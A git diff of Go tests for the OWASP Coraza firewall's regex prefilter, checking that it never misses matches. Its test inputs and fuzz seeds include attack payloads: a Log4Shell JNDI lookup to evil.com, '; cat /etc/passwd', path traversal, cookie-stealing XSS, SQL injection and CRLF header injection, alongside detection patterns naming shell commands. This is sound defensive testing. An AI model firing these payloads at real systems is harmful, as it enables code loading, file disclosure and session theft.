@@ -1,17 +1,16 @@
 // Copyright 2022 Juan Pablo Tosso and the OWASP Coraza contributors
 // SPDX-License-Identifier: Apache-2.0
 
-//go:build !coraza.disabled_operators.rx
-
 package operators
 
 import (
 	"fmt"
+	"math/rand"
 	"regexp"
 	"regexp/syntax"
 	"strings"
 	"testing"
-	"unicode/utf8"
+	"unicode"
 
 	"github.com/corazawaf/coraza/v3/experimental/plugins/plugintypes"
 	"github.com/corazawaf/coraza/v3/internal/corazawaf"
@@ -22,21 +21,52 @@ func TestMinMatchLength(t *testing.T) {
 		pattern string
 		want    int
 	}{
+		// Literals
 		{"abc", 3},
 		{"", 0},
+		{"a", 1},
+
+		// Alternation
 		{"a|bc", 1},
+		{"abc|de", 2},
+		{"abc|defgh|ij", 2},
+
+		// Optional / quantifiers
+		{"ab?c", 2},
+		{"a+", 1},
 		{"a*", 0},
 		{"a{3,5}", 3},
 		{"a{0,5}", 0},
+		{"a{1}", 1},
 		{"(ab){2}", 4},
-		{"[a-z]{3}", 3},
+
+		// Groups
+		{"(abc)", 3},
+		{"(?:abc)", 3},
+		{"((a)(b))", 2},
+
+		// Character classes
+		{".", 1},
+		{"\\d+", 1},
 		{"\\d*", 0},
+		{"[a-z]", 1},
+		{"[a-z]{3}", 3},
+
+		// Complex patterns
+		{"ab(cd|e)fg", 5},
 		{"(?i)hello", 5},
 		{"hello.*world", 10},
 		{"(?:union\\s+select|insert\\s+into)", 11},
+		{"sleep\\s*\\(", 6},
+
+		// Anchors (don't consume input)
 		{"^abc$", 3},
+		{"^$", 0},
+		{"\\bhello\\b", 5},
+
+		// Unicode
 		{"ハロー", 9},  // 3 runes × 3 bytes each
-		{"café", 5}, // é is 2 bytes (multibyte)
+		{"café", 5}, // é is 2 bytes
 	}
 	for _, tc := range tests {
 		t.Run(tc.pattern, func(t *testing.T) {
@@ -60,21 +90,17 @@ func TestPrefilterFuncBuildability(t *testing.T) {
 		match   string // input that the regex matches (checked when prefilter is non-nil)
 		noMatch string // input that the regex does not match (checked when prefilter is non-nil)
 	}{
-		// OpLiteral → allRequired{s}: the single-literal fast path (line 352).
-		// Every plain literal pattern must build a non-nil contains prefilter.
 		{"hello", false, "plain literal", "say hello", "goodbye"},
-		{"select", false, "sql keyword literal", "select 1", "update t"},
-		{"injection", false, "longer literal", "sql injection", "harmless"},
-		{"[a-z]+", true, "char class only", "", ""},
+		{"[a-z]+", false, "small character class", "letters", "12345"},
 		{"hello.*world", false, "literals around wildcard", "hello big world", "goodbye planet"},
 		{"(ab|cd)", false, "alternation with literals", "xabx", "xyz"},
 		{".*", true, "pure wildcard", "", ""},
-		{"\\d+", true, "digit class", "", ""},
+		{"\\d+", false, "digit class", "12345", "letters"},
 		{"sleep\\s*\\(", false, "literal with optional whitespace", "sleep(1)", "wake(1)"},
 		{"(?:union\\s+select|insert\\s+into)", false, "CRS-style alternation", "union select 1", "update set x"},
 		{".", true, "single any-char", "", ""},
 		{"(a|.)", true, "alternation with wildcard branch", "", ""},
-		{"(?:ab|[0-9]+)", true, "alternation where one branch has no literal", "", ""},
+		{"(?:ab|[0-9]+)", false, "literal and character class alternation", "123", "xyz"},
 		{"(abc)+", false, "repeated literal", "xabcabc", "xyzxyz"},
 		{"(abc)?", true, "optional group", "", ""},
 		{"(abc)*", true, "zero-or-more group", "", ""},
@@ -123,57 +149,232 @@ func TestPrefilterNeverCausesFalseNegatives(t *testing.T) {
 		// Basic literals
 		{"hello", "hello world", true},
 		{"hello", "goodbye", false},
+		{"hello", "helloworld", true},
+		{"hello", "say hello", true},
 
-		// Wildcards
+		// Wildcards between literals
 		{"hello.*world", "hello beautiful world", true},
+		{"hello.*world", "helloworld", true},
 		{"hello.*world", "goodbye", false},
 
 		// CRS-style SQLi alternations
 		{"(?:union\\s+select|insert\\s+into)", "union select * from t", true},
+		{"(?:union\\s+select|insert\\s+into)", "insert into t values", true},
 		{"(?:union\\s+select|insert\\s+into)", "delete from t", false},
 		{"(?:union\\s+select|insert\\s+into)", "UNION SELECT", false}, // case-sensitive
 
-		// Case-insensitive
+		// CRS-style with case-insensitive flag
 		{"(?i)(?:union\\s+select|insert\\s+into)", "UNION SELECT * FROM t", true},
+		{"(?i)(?:union\\s+select|insert\\s+into)", "Insert Into t values", true},
 		{"(?i)(?:union\\s+select|insert\\s+into)", "DELETE FROM t", false},
+
+		// Function call patterns
+		{"sleep\\s*\\(", "sleep(5)", true},
+		{"sleep\\s*\\(", "sleep  (5)", true},
+		{"sleep\\s*\\(", "awake(5)", false},
+
+		// Case-insensitive
+		{"(?i)hello", "HELLO", true},
+		{"(?i)hello", "Hello", true},
+		{"(?i)hello", "hElLo", true},
+		{"(?i)hello", "goodbye", false},
 		{"(?i)(?:select|union)", "SELECT", true},
+		{"(?i)(?:select|union)", "UNION", true},
+		{"(?i)(?:select|union)", "Union", true},
 		{"(?i)(?:select|union)", "delete", false},
 
-		// Alternation + groups
+		// Capture groups inside alternation
 		{"ab(cd|ef)gh", "abcdgh", true},
+		{"ab(cd|ef)gh", "abefgh", true},
 		{"ab(cd|ef)gh", "abxxgh", false},
+
+		// Three-way alternation
 		{"(?:cat|dog|bird)", "I have a cat", true},
+		{"(?:cat|dog|bird)", "I have a dog", true},
+		{"(?:cat|dog|bird)", "I have a bird", true},
 		{"(?:cat|dog|bird)", "I have a fish", false},
 
-		// Anchored, unicode, wildcard literal
-		{"^hello", "hello world", true},
-		{"^hello", "say hello", false},
-		{"^.00", "100", true},
-		{"00.$", "001", true},
+		// Short input rejected by minLen
+		{"hello", "hi", false},
+		{"hello", "hell", false},
+		{"hello", "hello", true},
+
+		// Empty input
+		{"hello", "", false},
+		{".*", "", true},
+
+		// Input exactly at minLen boundary
+		{"abc", "abc", true},
+		{"abc", "ab", false},
+		{"abc", "xabcx", true},
+
+		// Unicode
 		{"ハロー", "ハローワールド", true},
 		{"ハロー", "グッバイ", false},
-		{".*\\.exe", "malware.exe", true},
-		{".*\\.exe", "malware.txt", false},
+		{"café", "un café chaud", true},
+		{"café", "un cafe chaud", false}, // missing accent
 
-		// Pattern with no extractable literals (prefilter nil, regex runs)
+		// Anchored patterns
+		{"^hello", "hello world", true},
+		{"^hello", "say hello", false},
+		{"world$", "hello world", true},
+
+		// Nested groups
+		{"(a(bc)d)", "abcd", true},
+		{"(a(bc)d)", "axd", false},
+
+		// Repeated groups
+		{"(ab)+", "ab", true},
+		{"(ab)+", "abab", true},
+		{"(ab)+", "cd", false},
+
+		// Mixed required + optional parts
+		{"hello\\s*world", "helloworld", true},
+		{"hello\\s*world", "hello world", true},
+		{"hello\\s*world", "goodbye", false},
+
+		// Deeply nested alternation
+		{"(?:(?:aa|bb)\\s+(?:cc|dd))", "aa cc", true},
+		{"(?:(?:aa|bb)\\s+(?:cc|dd))", "bb dd", true},
+		{"(?:(?:aa|bb)\\s+(?:cc|dd))", "aa dd", true},
+		{"(?:(?:aa|bb)\\s+(?:cc|dd))", "xx yy", false},
+
+		// Pattern with no extractable literals (prefilter should be nil, regex runs)
 		{"[a-z]+\\d+", "abc123", true},
 		{"[a-z]+\\d+", "123", false},
+		{"\\d{3}-\\d{4}", "555-1234", true},
 
-		// Regression: trie suffix with wildcard interior must NOT join disjoint
-		// literals into a phantom string. "elect.*from" has allRequired{"elect","from"};
-		// joining them to "electfrom" would make the prefilter reject
-		// "select x from users" (which the regex matches) — a false negative.
-		{"s(?:elect.*from|leep)", "select x from users", true},
-		{"s(?:elect.*from|leep)", "sleep(5)", true},
-		{"s(?:elect.*from|leep)", "unrelated", false},
-
-		// Similar: prefix shared across one literal branch and one wildcard branch.
-		{"(?i)s(?:elect.*into|ubstr)", "SELECT x INTO y", true},
-		{"(?i)s(?:elect.*into|ubstr)", "SUBSTR(x,1)", true},
-		{"(?i)s(?:elect.*into|ubstr)", "unrelated", false},
+		// Literal at end after wildcard
+		{".*\\.exe", "malware.exe", true},
+		{".*\\.exe", "malware.txt", false},
 	}
 	for _, tc := range tests {
 		t.Run(fmt.Sprintf("%s/%s", tc.pattern, tc.input), func(t *testing.T) {
+			re := regexp.MustCompile(tc.pattern)
+			regexResult := re.MatchString(tc.input)
+			if regexResult != tc.matches {
+				t.Fatalf("test setup error: regex %q match on %q = %v, expected %v",
+					tc.pattern, tc.input, regexResult, tc.matches)
+			}
+
+			ml := minMatchLength(tc.pattern)
+			if regexResult && len(tc.input) < ml {
+				t.Errorf("FALSE NEGATIVE: minMatchLength(%q)=%d rejects matching input %q (len=%d)",
+					tc.pattern, ml, tc.input, len(tc.input))
+			}
+
+			pf := prefilterFunc(tc.pattern)
+			if pf != nil && regexResult && !pf(tc.input) {
+				t.Errorf("FALSE NEGATIVE: prefilter(%q) returned false for matching input %q",
+					tc.pattern, tc.input)
+			}
+		})
+	}
+}
+
+// TestPrefilterCRSPatterns tests against real-world CRS (OWASP Core Rule Set) patterns.
+// These are representative patterns from common CRS rules that @rx evaluates.
+func TestPrefilterCRSPatterns(t *testing.T) {
+	tests := []struct {
+		name    string
+		pattern string
+		input   string
+		matches bool
+	}{
+		// Log4Shell (CVE-2021-44228) detection pattern
+		{
+			name:    "log4shell_match",
+			pattern: `(?i)(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)(?:[^\}]{0,15}(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)|jndi|ctx)`,
+			input:   "${jndi:ldap://evil.com/a}",
+			matches: true,
+		},
+		{
+			name:    "log4shell_no_match",
+			pattern: `(?i)(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)(?:[^\}]{0,15}(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)|jndi|ctx)`,
+			input:   "GET /index.html HTTP/1.1",
+			matches: false,
+		},
+		// SQL injection keywords
+		{
+			name:    "sqli_union_select",
+			pattern: `(?i)(?:union\s+(?:all\s+)?select)`,
+			input:   "1 UNION ALL SELECT * FROM users",
+			matches: true,
+		},
+		{
+			name:    "sqli_union_select_benign",
+			pattern: `(?i)(?:union\s+(?:all\s+)?select)`,
+			input:   "trade union membership",
+			matches: false,
+		},
+		// XSS patterns
+		{
+			name:    "xss_script_tag",
+			pattern: `(?i)<script[^>]*>`,
+			input:   `<script>alert(1)</script>`,
+			matches: true,
+		},
+		{
+			name:    "xss_script_tag_benign",
+			pattern: `(?i)<script[^>]*>`,
+			input:   "just a normal paragraph",
+			matches: false,
+		},
+		// Command injection
+		{
+			name:    "cmdi_match",
+			pattern: `(?:;|\|)\s*(?:cat|ls|id|whoami|passwd)`,
+			input:   "; cat /etc/passwd",
+			matches: true,
+		},
+		{
+			name:    "cmdi_benign",
+			pattern: `(?:;|\|)\s*(?:cat|ls|id|whoami|passwd)`,
+			input:   "catalog items for sale",
+			matches: false,
+		},
+		// Path traversal
+		{
+			name:    "path_traversal_match",
+			pattern: `(?:(?:\.{2}[/\\]){3,})`,
+			input:   "../../../etc/passwd",
+			matches: true,
+		},
+		{
+			name:    "path_traversal_benign",
+			pattern: `(?:(?:\.{2}[/\\]){3,})`,
+			input:   "/normal/path/to/file",
+			matches: false,
+		},
+		// PHP injection
+		{
+			name:    "php_injection_match",
+			pattern: `(?i)<\?(?:php|=)`,
+			input:   `<?php echo "pwned"; ?>`,
+			matches: true,
+		},
+		{
+			name:    "php_injection_benign",
+			pattern: `(?i)<\?(?:php|=)`,
+			input:   "just some text",
+			matches: false,
+		},
+		// HTTP response splitting
+		{
+			name:    "response_splitting_match",
+			pattern: `[\r\n]\s*(?:content-(?:type|length)|set-cookie|location)\s*:`,
+			input:   "\r\ncontent-type: text/html",
+			matches: true,
+		},
+		{
+			name:    "response_splitting_benign",
+			pattern: `[\r\n]\s*(?:content-(?:type|length)|set-cookie|location)\s*:`,
+			input:   "normal request body",
+			matches: false,
+		},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
 			re := regexp.MustCompile(tc.pattern)
 			regexResult := re.MatchString(tc.input)
 			if regexResult != tc.matches {
@@ -411,11 +612,37 @@ func TestContainsFoldASCII(t *testing.T) {
 	}
 }
 
-// TestBinaryRXBypassesPrefilter verifies that patterns containing non-UTF8 byte
-// sequences (e.g. \xac\xed\x00\x05) go through the binaryRX path and do NOT
-// get a prefilter attached. This is critical because rxprefilter.go only handles
-// standard regexp.Regexp, not binaryregexp.Regexp.
-func TestBinaryRXBypassesPrefilter(t *testing.T) {
+func TestFoldedLiteralMatcherMatchesReferenceSearch(t *testing.T) {
+	random := rand.New(rand.NewSource(42))
+	const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 _-/"
+	for _, needle := range []string{"select", "request", "javascript", "x", "ab", "content-type"} {
+		matcher := newFoldedLiteralMatcher(needle)
+		for iteration := 0; iteration < 5000; iteration++ {
+			value := make([]byte, random.Intn(512))
+			for index := range value {
+				value[index] = alphabet[random.Intn(len(alphabet))]
+			}
+			if len(needle) <= len(value) && random.Intn(2) == 0 {
+				start := random.Intn(len(value) - len(needle) + 1)
+				copy(value[start:], needle)
+				for index := start; index < start+len(needle); index++ {
+					if value[index] >= 'a' && value[index] <= 'z' && random.Intn(2) == 0 {
+						value[index] -= 'a' - 'A'
+					}
+				}
+			}
+			text := string(value)
+			want := containsFoldASCIIOnly(text, needle)
+			if have := matcher.match(text); have != want {
+				t.Fatalf("needle %q, input %q: want %v, have %v", needle, text, want, have)
+			}
+		}
+	}
+}
+
+// TestBinaryRXMatchesArbitraryBytes verifies that non-UTF8 patterns use the
+// binary matcher and preserve its matching behavior when prefiltering is off.
+func TestBinaryRXMatchesArbitraryBytes(t *testing.T) {
 	tests := []struct {
 		name    string
 		pattern string
@@ -455,9 +682,12 @@ func TestBinaryRXBypassesPrefilter(t *testing.T) {
 				t.Fatal(err)
 			}
 
-			// Verify it's a binaryRX, not an rx with prefilter
-			if _, ok := op.(*binaryRX); !ok {
+			binaryOperator, ok := op.(*binaryRX)
+			if !ok {
 				t.Fatalf("expected binaryRX for pattern %q, got %T", tc.pattern, op)
+			}
+			if binaryOperator.prefilter != nil {
+				t.Fatal("binary prefilter must remain disabled unless SecRxPreFilter is enabled")
 			}
 
 			waf := corazawaf.NewWAF()
@@ -629,6 +859,65 @@ func TestMemoizeSharesPrefilter(t *testing.T) {
 	}
 }
 
+// TestPrefilterConcurrentSafety verifies the prefilter closure and Aho-Corasick
+// automaton can be safely called from multiple goroutines concurrently.
+func TestPrefilterConcurrentSafety(t *testing.T) {
+	rxPattern := `(?i)(?:union\s+select|insert\s+into|delete\s+from)`
+	opts := plugintypes.OperatorOptions{Arguments: rxPattern, RxPreFilterEnabled: true}
+	op, err := newRX(opts)
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	if op.(*rx).prefilter == nil {
+		t.Fatal("prefilter not built: RxPreFilterEnabled is required for this test")
+	}
+
+	inputs := []string{
+		"union select * from t",
+		"INSERT INTO t VALUES",
+		"normal request",
+		"GET /index.html HTTP/1.1",
+		"delete from users",
+		"",
+		"UNION SELECT 1,2,3",
+	}
+
+	// Run 100 goroutines, each evaluating all inputs
+	const goroutines = 100
+	errs := make(chan error, goroutines*len(inputs))
+	done := make(chan struct{})
+
+	// Compile the reference regex once, outside the goroutines.
+	re := regexp.MustCompile(rxPattern)
+
+	for g := 0; g < goroutines; g++ {
+		go func() {
+			for _, inp := range inputs {
+				waf := corazawaf.NewWAF()
+				tx := waf.NewTransaction()
+				tx.Capture = true
+				got := op.Evaluate(tx, inp)
+
+				want := re.MatchString(inp)
+				if got != want {
+					errs <- fmt.Errorf("input %q: concurrent Evaluate=%v, regex=%v", inp, got, want)
+				}
+			}
+			done <- struct{}{}
+		}()
+	}
+
+	for g := 0; g < goroutines; g++ {
+		<-done
+	}
+	close(errs)
+
+	for err := range errs {
+		t.Error(err)
+	}
+}
+
 // TestPrefilterUnicodeFoldingSafety verifies that the prefilter does not produce
 // false negatives when the input contains non-ASCII characters that are Unicode
 // fold equivalents of ASCII letters. Go's regexp (?i) uses Unicode simple case
@@ -666,18 +955,6 @@ func TestPrefilterUnicodeFoldingSafety(t *testing.T) {
 			name:    "kelvin_ok",
 			pattern: "(?i)ok",
 			input:   "o\u212a",
-			matches: true,
-		},
-		{
-			name:    "long_s_pattern_ascii_input",
-			pattern: "(?i)ſ",
-			input:   "s",
-			matches: true,
-		},
-		{
-			name:    "kelvin_pattern_ascii_input",
-			pattern: "(?i)\u212a",
-			input:   "k",
 			matches: true,
 		},
 		// Mixed: non-ASCII input but no fold relevance (should still be safe)
@@ -904,11 +1181,8 @@ func TestPrefilterEdgeCases(t *testing.T) {
 	}
 }
 
-// TestAnyRequiredNeverFiltered verifies that the anyRequired path uses
-// anyTooShort (fail-safe) instead of filterShort (silently remove). If any
-// alternation branch produces a short literal, the prefilter should be nil
-// (no prefilter) rather than checking only the longer alternatives, which
-// would risk false negatives.
+// TestAnyRequiredNeverFiltered verifies that short alternation branches stay
+// in the prefilter instead of being silently removed.
 func TestAnyRequiredNeverFiltered(t *testing.T) {
 	// Pattern (é|hello) — é is a single rune but 2 bytes in UTF-8.
 	// Both branches should produce usable literals. The prefilter should
@@ -929,18 +1203,16 @@ func TestAnyRequiredNeverFiltered(t *testing.T) {
 		}
 	})
 
-	// Verify that anyTooShort correctly detects short elements
+	// Only empty alternatives force a bail-out; one-byte alternatives remain
+	// useful when combined with larger assembled-rule dictionaries.
 	t.Run("anyTooShort_function", func(t *testing.T) {
-		if anyTooShort([]string{"ab", "cd", "ef"}, 2) {
-			t.Error("expected false for all >= 2")
+		if anyTooShort([]string{"a", "cd", "ef"}, 1) {
+			t.Error("expected false for all non-empty literals")
 		}
-		if !anyTooShort([]string{"ab", "c", "ef"}, 2) {
-			t.Error("expected true when one element is < 2")
-		}
-		if !anyTooShort([]string{"", "ab"}, 2) {
+		if !anyTooShort([]string{"", "ab"}, 1) {
 			t.Error("expected true for empty element")
 		}
-		if anyTooShort([]string{}, 2) {
+		if anyTooShort([]string{}, 1) {
 			t.Error("expected false for empty slice")
 		}
 	})
@@ -967,45 +1239,168 @@ func TestParseErrorPaths(t *testing.T) {
 	}
 }
 
+// TestAllASCIIStrings directly tests the allASCIIStrings helper.
+func TestAllASCIIStrings(t *testing.T) {
+	if !allASCIIStrings(nil) {
+		t.Error("allASCIIStrings(nil) should return true")
+	}
+	if !allASCIIStrings([]string{}) {
+		t.Error("allASCIIStrings([]) should return true")
+	}
+	if !allASCIIStrings([]string{"abc", "def"}) {
+		t.Error("allASCIIStrings([\"abc\",\"def\"]) should return true")
+	}
+	if allASCIIStrings([]string{"abc", "héllo"}) {
+		t.Error("allASCIIStrings with non-ASCII should return false")
+	}
+	if allASCIIStrings([]string{"ハロー"}) {
+		t.Error("allASCIIStrings with non-ASCII only should return false")
+	}
+}
+
+// TestPrefilterSafetyInvariants tests structural invariants that must hold
+// for the prefilter to be safe. These tests catch regressions in the
+// extraction logic that could silently introduce false negatives.
+func TestPrefilterSafetyInvariants(t *testing.T) {
+	// Invariant: for any regex pattern and any input, if the regex matches
+	// and we have a prefilter, the prefilter must return true.
+	// This is tested exhaustively by the fuzz tests, but here we focus on
+	// specific structural patterns that are most likely to regress.
+
+	structural := []struct {
+		name    string
+		pattern string
+		input   string
+	}{
+		// Concat where one child is anyRequired (skipped, not promoted)
+		{"concat_with_anyRequired_child", "(?:union|select)\\s+from", "union from"},
+		// Alternation where all branches have allRequired
+		{"alt_all_branches_allRequired", "(?:hello world|goodbye world)", "hello world"},
+		// Alternation with nested alternation (v... merge)
+		{"nested_alt_merge", "aa|(bb|cc)", "cc"},
+		// Case-insensitive with ASCII input
+		{"ci_ascii_input", "(?i)select", "SELECT"},
+		// Case-insensitive with non-ASCII input (must be conservative)
+		{"ci_non_ascii_input", "(?i)select", "ſelect"},
+		// Case-sensitive with exact bytes
+		{"cs_exact_bytes", "hello", "hello"},
+		// Pattern with (?sm) prefix (from newRX)
+		{"sm_prefix", "(?sm)hello.*world", "hello\nworld"},
+		// Multi-byte unicode literal
+		{"unicode_literal", "café", "un café chaud"},
+	}
+
+	for _, tc := range structural {
+		t.Run(tc.name, func(t *testing.T) {
+			re := regexp.MustCompile(tc.pattern)
+			if !re.MatchString(tc.input) {
+				t.Fatalf("test bug: regex %q doesn't match %q", tc.pattern, tc.input)
+			}
+
+			ml := minMatchLength(tc.pattern)
+			if len(tc.input) < ml {
+				t.Errorf("SAFETY VIOLATION: minLen=%d rejects matching input len=%d", ml, len(tc.input))
+			}
+
+			pf := prefilterFunc(tc.pattern)
+			if pf != nil && !pf(tc.input) {
+				t.Errorf("SAFETY VIOLATION: prefilter rejects matching input %q", tc.input)
+			}
+		})
+	}
+}
+
 // FuzzPrefilterNoFalseNegatives uses Go's built-in fuzz testing to verify with
 // random patterns AND inputs that the prefilter never rejects an input the
 // regex matches. This is the primary safety net — it generates arbitrary
 // regex patterns that the fuzzer evolves to maximize code coverage.
 // Run with: go test -tags coraza.rule.rx_prefilter -fuzz=FuzzPrefilterNoFalseNegatives -fuzztime=60s
 func FuzzPrefilterNoFalseNegatives(f *testing.F) {
-	// Seed corpus: CRS-representative patterns × realistic inputs.
+	// Seed corpus with CRS-representative patterns and realistic inputs.
 	patterns := []string{
+		// Simple
 		"hello",
 		"hello.*world",
-		"^.00",
-		"00.$",
+		"(?i)hello",
+		// CRS-style SQLi
+		"(?:union|select|insert)",
 		"(?i)(?:union\\s+select|insert\\s+into)",
+		"(?i)(?:union\\s+(?:all\\s+)?select)",
+		// CRS-style command injection
 		"(?:;|\\|)\\s*(?:cat|ls|id|whoami)",
+		// CRS-style XSS
 		"(?i)<script[^>]*>",
+		"(?i)(?:on(?:error|load|click)\\s*=)",
+		// Function calls
 		"sleep\\s*\\(",
+		// Nested alternation (found by prior fuzzing)
 		"10|(10|00)",
+		"(a|b)|(c|d)",
+		"(?:(?:aa|bb)|(?:cc|dd))",
+		// Complex nesting
 		"ab(cd|ef)gh",
 		"(?:cat|dog|bird)",
+		// Path traversal
+		"(?:\\.{2}[/\\\\]){2,}",
+		// Anchored
+		"^hello$",
+		"\\bhello\\b",
+		// Repetition
 		"(ab)+",
+		"(abc){2,4}",
+		// Optional parts
+		"hello\\s*world",
+		"(?:foo)?bar",
+		// Character classes with literals
 		"[a-z]+test",
+		"test[0-9]+end",
+		// Unicode
 		"ハロー",
+		"café",
 	}
 	inputs := []string{
+		// Benign traffic
 		"GET /index.html HTTP/1.1",
 		"POST /api/v1/users HTTP/1.1",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+		"just a normal string with spaces",
+		// Attack payloads
 		"union select * from users--",
 		"UNION ALL SELECT 1,2,3",
+		"insert into t values(1)",
+		"INSERT INTO t VALUES(1)",
 		"; cat /etc/passwd",
+		"| ls -la /",
 		"sleep(5)",
 		"<script>alert(1)</script>",
+		"<SCRIPT>alert(document.cookie)</SCRIPT>",
 		"onerror=alert(1)",
 		"../../../etc/passwd",
+		"${jndi:ldap://evil.com/a}",
+		"<?php echo 'pwned'; ?>",
+		"\r\ncontent-type: text/html",
+		// Edge cases
 		"",
+		"x",
+		"00",
+		"10",
 		"hello",
 		"HELLO",
+		"hElLo",
+		"hello world",
+		"helloworld",
 		"abcdgh",
-		"ſelect",
+		"abefgh",
+		strings.Repeat("a", 100),
+		strings.Repeat("ab", 50),
+		// Unicode
+		"ハローワールド",
 		"un café chaud",
+		// Unicode fold equivalents (ſ = long s, K = Kelvin sign)
+		"ſelect",
+		"ſleep(5)",
+		"o\u212a",
+		"inſert into t",
 	}
 	for _, p := range patterns {
 		for _, inp := range inputs {
@@ -1052,7 +1447,12 @@ func FuzzPrefilterFixedCRSPatterns(f *testing.F) {
 	f.Add("sleep(5)")
 	f.Add("../../../etc/passwd")
 	f.Add("")
+	f.Add("x")
+	f.Add(strings.Repeat("union", 20))
 	f.Add("UNION SELECT")
+	f.Add("' OR '1'='1")
+	f.Add("${jndi:ldap://x}")
+	f.Add("\r\nSet-Cookie: evil=1")
 
 	// Fixed patterns representative of real CRS rules
 	crsPatterns := []string{
@@ -1109,769 +1509,625 @@ func FuzzPrefilterFixedCRSPatterns(f *testing.F) {
 	})
 }
 
-// TestPrefilterCodePaths exercises specific code paths in prefilterFunc and
-// extractLiterals via table-driven cases.  Each entry targets a particular
-// branch/guard to ensure coverage without needing a dedicated function.
-func TestPrefilterCodePaths(t *testing.T) {
-	tests := []struct {
-		name    string
-		pattern string
-		wantPF  bool   // whether prefilterFunc should return non-nil
-		pass    string // input the prefilter must accept (skip if "")
-		reject  string // input the prefilter must reject (skip if "")
-	}{
-		// --- minMatchLength edge cases ---
-		{"mml_rune_error", "\xef\xbf\xbd", false, "", ""},
-		{"mml_rune_error_plus_literal", "(?s)\xef\xbf\xbd" + "hello", true, "\xef\xbf\xbdhello!xx", "hello"},
-		{"mml_repeat_3_5", "a{3,5}", false, "", ""},
-		{"mml_repeat_0_5", "a{0,5}", false, "", ""},
-
-		// --- allRequired paths ---
-		{"all_filtered_to_empty", "(?s)a.*", false, "", ""},
-		{"all_filtered_short", "(?s)a.*b", false, "", ""},
-		{"all_multi_CS", "(?s)hello.*world", true, "prefix hello middle world suffix", "prefix hello middle suffix"},
-		{"all_multi_CI", "(?si)hello.*world", true, "foo HELLO bar WORLD baz", "foo HELLO bar baz"},
-
-		// --- anyRequired paths ---
-		{"any_CS_2_elements", "(?s)(?:hello|world)", true, "contains hello here", "contains nothing here"},
-		{"any_CI_2_elements", "(?si)(?:hello|world)", true, "HELLO there", "nothing here"},
-		{"any_too_short_bailout", "(?s)(?:a|hello)", false, "", ""},
-		{"any_non_ascii_CI_bailout", "(?si)(?:café|naïve)", false, "", ""},
-		{"any_nested_alternation", "(?s)(?:hello|(?:world|test))", true, "test", "none"},
-
-		// --- OpConcat with anyRequired child ---
-		{"concat_any_child_surfaces_allRequired", "(?s)(?:ab|cd).*required", true, "ab stuff required here", "ab stuff missing here"},
-
-		// --- OpAlternate nil branch → abandon ---
-		{"alt_nil_branch", "(?s)(?:hello|.+)", false, "", ""},
-		{"alt_all_nil_branches", "(?s)(?:.+|.*)", false, "", ""},
-
-		// --- OpRepeat min==0 → nil ---
-		{"repeat_min_zero", "(?s)(?:hello){0,3}", false, "", ""},
-
-		// --- case-insensitive non-ASCII passthrough ---
-		{"ci_non_ascii_input_passthrough", "(?si)hello", true, "héllo", "goodbye"},
-		{"cs_returns_directly", "(?s)hello", true, "say hello", "café"},
-
-		// --- helpers ---
-		{"longest_nil", "", false, "", ""},
-		{"allASCIIStrings_non_ascii", "(?si)(?:café|naïve)", false, "", ""},
-	}
-
-	for _, tc := range tests {
-		t.Run(tc.name, func(t *testing.T) {
-			if tc.pattern == "" {
-				// Test helpers directly
-				if got := longest(nil); got != "" {
-					t.Errorf("longest(nil) = %q, want empty", got)
-				}
-				if !allASCIIStrings([]string{"hello", "world"}) {
-					t.Error("allASCIIStrings should return true for all ASCII")
-				}
-				if allASCIIStrings([]string{"hello", "café"}) {
-					t.Error("allASCIIStrings should return false for non-ASCII")
-				}
-				return
-			}
-
-			pf := prefilterFunc(tc.pattern)
-			if tc.wantPF && pf == nil {
-				t.Fatalf("prefilterFunc(%q) = nil, want non-nil", tc.pattern)
-			}
-			if !tc.wantPF && pf != nil {
-				t.Fatalf("prefilterFunc(%q) = non-nil, want nil", tc.pattern)
-			}
-			if pf == nil {
-				return
-			}
-			if tc.pass != "" && !pf(tc.pass) {
-				t.Errorf("prefilter rejected %q — expected pass", tc.pass)
-			}
-			if tc.reject != "" && pf(tc.reject) {
-				t.Errorf("prefilter accepted %q — expected reject", tc.reject)
-			}
-		})
-	}
-
-	// Additional minMatchLength checks
-	if got := minMatchLength("\xef\xbf\xbd"); got != 1 {
+// TestMinLenRuneError verifies that U+FFFD in a literal counts as 1 byte, not 3.
+func TestMinLenRuneError(t *testing.T) {
+	// Pattern with a literal U+FFFD — after parsing, the AST has an OpLiteral
+	// with rune U+FFFD. Go's regexp matches this against a single invalid byte.
+	got := minMatchLength("\xef\xbf\xbd")
+	if got != 1 {
 		t.Errorf("minMatchLength(U+FFFD) = %d, want 1", got)
 	}
-	if got := minMatchLength("ab\xef\xbf\xbd"); got != 3 {
-		t.Errorf("minMatchLength(ab+U+FFFD) = %d, want 3", got)
+	// Mixed: literal 'ab' + U+FFFD = 2 + 1 = 3
+	got = minMatchLength("ab\xef\xbf\xbd")
+	if got != 3 {
+		t.Errorf("minMatchLength(ab + U+FFFD) = %d, want 3", got)
 	}
+}
+
+// TestExtractLiteralsRuneError verifies that U+FFFD in a literal causes bail-out.
+func TestExtractLiteralsRuneError(t *testing.T) {
+	pf := prefilterFunc("(?s)\xef\xbf\xbd" + "hello")
+	// Should bail out because the literal contains U+FFFD.
+	if pf != nil {
+		t.Error("prefilterFunc should return nil for pattern containing U+FFFD literal")
+	}
+}
+
+func TestPrefilterAllRequiredRetainsSingleByteLiteral(t *testing.T) {
+	pf := prefilterFunc("(?s)a.*")
+	if pf == nil {
+		t.Fatal("prefilterFunc should retain a required one-byte literal")
+	}
+	if !pf("abc") || pf("zzz") {
+		t.Error("unexpected one-byte required-literal result")
+	}
+}
+
+// TestPrefilterAllRequiredMultiNeedleCaseInsensitive covers the case-insensitive
+// multi-needle allRequired path (lines 194-202).
+func TestPrefilterAllRequiredMultiNeedleCaseInsensitive(t *testing.T) {
+	// Pattern: (?i)hello.*world — two required CI literals.
+	pf := prefilterFunc("(?si)hello.*world")
+	if pf == nil {
+		t.Fatal("prefilterFunc should return non-nil for (?i)hello.*world")
+	}
+	// Both present (case-insensitive match)
+	if !pf("foo HELLO bar WORLD baz") {
+		t.Error("expected true when both CI literals present")
+	}
+	// One missing
+	if pf("foo HELLO bar baz") {
+		t.Error("expected false when 'world' is absent")
+	}
